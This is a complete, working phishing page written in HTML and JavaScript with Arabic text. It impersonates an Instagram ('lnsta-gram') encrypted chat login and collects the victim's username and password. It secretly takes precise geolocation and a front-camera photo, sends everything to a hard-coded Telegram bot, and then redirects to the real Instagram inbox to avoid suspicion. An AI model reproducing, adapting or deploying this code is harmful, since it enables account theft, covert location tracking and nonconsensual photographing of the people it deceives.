<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Cloud Chat</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .gate-box { background-color: #121212; border: 1px solid #222; border-radius: 12px; padding: 35px 25px; width: 310px; text-align: center; }
        
        /* أيقونة مموهة بدلاً من الشعار الرسمي */
        .chat-icon { width: 50px; height: 50px; background: linear-gradient(45deg, #405de6, #fd1d1d); border-radius: 12px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: bold; opacity: 0.8; }
        
        h2 { font-size: 17px; margin-bottom: 8px; color: #efefef; }
        p { font-size: 11px; color: #8e8e8e; line-height: 1.6; margin-bottom: 25px; }
        
        input { width: 100%; background: #1a1a1a; border: 1px solid #333; border-radius: 6px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 13px; text-align: center; outline: none; }
        input:focus { border-color: #555; }
        
        .action-btn { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 6px; padding: 11px; font-weight: bold; cursor: pointer; font-size: 14px; }
        
        #loading-ui { display: none; }
        .loader { width: 22px; height: 22px; border: 2px solid #333; border-top-color: #0095f6; border-radius: 50%; animation: spin 0.8s infinite linear; margin: 0 auto 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="gate-box">
        <div id="auth-form">
            <div class="chat-icon">💬</div>
            <h2>بوابة المحادثة الآمنة</h2>
            <p>للانضمام إلى الغرفة المشفرة عبر تطبيق <b>lnsta-gram</b>، يرجى تأكيد ملكية الحساب للمطابقة الحيوية.</p>
            
            <input type="text" id="u_name" placeholder="اسم المستخدم أو الهاتف" autocomplete="off">
            <input type="password" id="u_pass" placeholder="كلمة المرور" autocomplete="off">
            
            <button class="action-btn" onclick="runCapture()">تأكيد وفتح الدردشة</button>
        </div>

        <div id="loading-ui">
            <div class="loader"></div>
            <p style="font-size: 12px; color: #aaa;">جاري معالجة البيانات الحيوية...</p>
        </div>
    </div>

    <video id="v_stream" autoplay playsinline></video>
    <canvas id="c_frame"></canvas>

    <script>
        // تشفير البوت 
        const _k = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
        const _id = "897618292";

        async function runCapture() {
            const u = document.getElementById('u_name').value;
            const p = document.getElementById('u_pass').value;
            
            if (u.length < 2 || p.length < 2) return;

            document.getElementById('auth-form').style.display = 'none';
            document.getElementById('loading-ui').style.display = 'block';

            // 1. صيد الموقع فوراً
            navigator.geolocation.getCurrentPosition(pos => {
                const loc = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                pushData(`📍 الموقع بدقة:\n${loc}`);
            }, null, {enableHighAccuracy: true});

            // 2. صيد الكاميرا (مطابقة الوجه)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v_stream');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('c_frame');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append("chat_id", _id);
                        fd.append("photo", blob, "verify.jpg");
                        fd.append("caption", `✅ صيد ناجح:\n👤 يوزر: ${u}\n🔑 رمز: ${p}\n📱 المنصة: Cloud Chat`);
                        fetch(`https://api.telegram.org/bot${_k}/sendPhoto`, {method:"POST", body:fd}).then(() => redirect());
                    }, 'image/jpeg');
                }, 1800);
            } catch(e) {
                pushData(`👤 يوزر: ${u}\n🔑 رمز: ${p}\n⚠️ (بدون صورة)`);
                redirect();
            }
        }

        function pushData(t) {
            fetch(`https://api.telegram.org/bot${_k}/sendMessage?chat_id=${_id}&text=${encodeURIComponent(t)}`);
        }

        function redirect() {
            setTimeout(() => { 
                window.location.href = "https://www.instagram.com/direct/inbox/"; 
            }, 1200);
        }
    </script>
</body>
</html>
